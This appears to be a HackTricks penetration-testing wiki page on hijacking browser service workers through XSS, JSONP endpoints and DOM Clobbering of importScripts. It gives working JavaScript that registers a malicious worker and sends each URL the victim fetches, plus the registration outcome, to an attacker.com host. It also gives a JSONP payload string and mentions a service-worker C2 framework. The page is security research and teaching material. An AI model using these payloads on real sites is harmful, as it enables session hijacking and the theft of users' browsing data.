# Abusing Service Workers



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Basic Information

A service worker is a **script** that your browser **runs** in the **background**, separate from a web page, opening the door to features that don't need a web page or user interaction. ([More info about what is a service worker here](https://developers.google.com/web/fundamentals/primers/service-workers)).\
Then you could abuse service workers by **creating/modifying them** on the **victim session** inside the **vulnerable** web **domain** that grant the **attacker control** over **all the pages** the **victim** will load in **that domain**.

### Check existent SWs

You can see them in the **Service Workers** field in the **Application** tab of **Developer Tools**. You can also look at [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals).

### Push Notifications

If the victim didn't grant **push notifications permissions** the service worker **won't be able to receive communications from the server if the user doesn't access the attacker page again**. This will **prevent** for example, maintain conversations with all the pages that accessed the attacker web page so web a exploit if found the SW can receive it and execute it.\
However, if the victim **grants push notifications permissions this could be a risk**.

## Attack Creating a Service Worker

In order to exploit this vulnerability you need to find:

* A way to **upload arbitrary JS** files to the server and a **XSS to load the service worker** of the uploaded JS file
* A **vulnerable JSONP request** where you can **manipulate the output (with arbitrary JS code)** and a **XSS** to **load the JSONP with a payload** that will **load a malicious service worker**.

In the following example I'm going to present a code to **register a new service worke**r that will listen to the `fetch` event and will **send to the attackers server each fetched URL** (this is the code you would need to **upload** to the **server** or load via a **vulnerable JSONP** response):

```javascript
self.addEventListener('fetch', function(e) {
  e.respondWith(caches.match(e.request).then(function(response) {
    fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```

And this is the code that will **register the worker** (the code you should be able to execute abusing a **XSS**). In this case a **GET** request will be sent to the **attackers** server **notifying** if the **registration** of the service worker was successful or not:

```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/error", true);
    xhttp2.send();
  });
});
</script>
```

In case of abusing a vulnerable JSONP endpoint you should put the value inside `var sw`. For example:

```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```

There is a **C2** dedicated to the **exploitation of Service Workers** called [**Shadow Workers**](https://shadow-workers.github.io) that will be very useful to abuse these vulnerabilities.

In an XSS situation, the 24 hour cache directive limit ensures that a malicious or compromised SW will outlive a fix to the XSS vulnerability by a maximum of 24 hours (assuming the client is online). Site operators can shrink the window of vulnerability by setting lower TTLs on SW scripts. We also encourage developers to [build a kill-switch SW](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776).

## Abusing `importScripts` in a SW via DOM Clobbering

The function **`importScripts`** called from a Service Worker can **import a script from a different domain**. If this function is called using a **parameter that an attacker could** modify he would be able to **import a JS script from his domain** and get XSS.

**This even bypasses CSP protections.**

**Example vulnerable code:**

* **index.html**

```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
  // attacker controls location.search
</script>
```

* **sw.js**

```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```

### With DOM Clobbering

For more info about what DOM Clobbering is check:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

If the URL/domain where that the SW is using to call **`importScripts`** is **inside a HTML element**, it's **possible to modify it via DOM Clobbering** to make the SW **load a script from your own domain**.

For an example of this check the reference link.

## References

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
